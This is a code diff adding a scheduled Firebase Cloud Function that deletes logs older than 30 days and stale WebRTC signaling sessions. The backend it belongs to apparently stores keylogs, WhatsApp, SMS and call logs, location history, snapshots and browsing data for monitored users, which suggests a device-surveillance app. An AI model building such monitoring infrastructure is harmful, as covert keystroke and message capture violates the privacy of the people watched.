@@ -201,3 +201,93 @@ exports.onCommandSent = functions.database
     }
     return null;
   });
+
+/**
+ * Scheduled Cloud Function: Daily auto-cleanup for logs older than 30 days
+ * Keeps Realtime Database fast, optimizes quotas, and prevents memory bloat.
+ */
+exports.cleanupOldData = functions.pubsub
+  .schedule("every 24 hours")
+  .onRun(async (context) => {
+    const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
+    const cutoffTime = Date.now() - THIRTY_DAYS_MS;
+    const db = admin.database();
+
+    const nodesToPrune = [
+      "whatsapp_logs",
+      "notifications",
+      "call_logs",
+      "sms_logs",
+      "web_history",
+      "network_history",
+      "keylogs",
+      "wifi_logs",
+      "social_media_usage",
+      "snapshots",
+      "location_history"
+    ];
+
+    console.log(`Starting automated daily cleanup. Cutoff time: ${new Date(cutoffTime).toISOString()}`);
+
+    for (const node of nodesToPrune) {
+      try {
+        const rootRef = db.ref(node);
+        const childrenSnapshot = await rootRef.once("value");
+        if (!childrenSnapshot.exists()) continue;
+
+        const promises = [];
+        childrenSnapshot.forEach((childSnap) => {
+          const childUid = childSnap.key;
+          const userLogsRef = db.ref(`${node}/${childUid}`);
+
+          promises.push(
+            userLogsRef
+              .orderByChild("timestamp")
+              .endAt(cutoffTime)
+              .once("value")
+              .then((snapshot) => {
+                if (!snapshot.exists()) return null;
+                const updates = {};
+                snapshot.forEach((itemSnap) => {
+                  updates[itemSnap.key] = null;
+                });
+                return userLogsRef.update(updates);
+              })
+              .catch((err) => {
+                console.error(`Error pruning ${node}/${childUid}:`, err);
+              })
+          );
+        });
+
+        await Promise.all(promises);
+        console.log(`Completed pruning for node: ${node}`);
+      } catch (err) {
+        console.error(`Failed to prune node ${node}:`, err);
+      }
+    }
+
+    // Clean up stale WebRTC signaling sessions older than 2 hours
+    try {
+      const TWO_HOURS_MS = 2 * 60 * 60 * 1000;
+      const signalingCutoff = Date.now() - TWO_HOURS_MS;
+      const signalingRef = db.ref("signaling");
+      const sigSnap = await signalingRef.once("value");
+      if (sigSnap.exists()) {
+        const sigUpdates = {};
+        sigSnap.forEach((item) => {
+          const val = item.val();
+          if (val && val.timestamp && val.timestamp < signalingCutoff) {
+            sigUpdates[item.key] = null;
+          }
+        });
+        if (Object.keys(sigUpdates).length > 0) {
+          await signalingRef.update(sigUpdates);
+          console.log(`Cleaned up ${Object.keys(sigUpdates).length} stale signaling sessions.`);
+        }
+      }
+    } catch (err) {
+      console.error("Failed to clean up stale signaling sessions:", err);
+    }
+
+    return null;
+  });
